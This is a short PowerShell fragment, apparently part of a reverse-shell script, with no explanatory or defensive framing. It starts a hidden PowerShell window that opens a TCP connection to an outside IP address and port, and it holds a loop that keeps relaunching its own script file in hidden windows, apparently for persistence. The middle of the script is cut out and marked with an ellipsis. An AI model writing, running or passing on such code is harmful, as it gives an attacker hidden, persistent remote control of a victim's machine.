Start-Process $PSHOME\powershell.exe -WindowStyle Hidden -ArgumentList { 
    Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('147.185.221.19',54899))
...
while ($true) {
    $programPath = $MyInvocation.MyCommand.Path
    Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$programPath`"" -WindowStyle Hidden
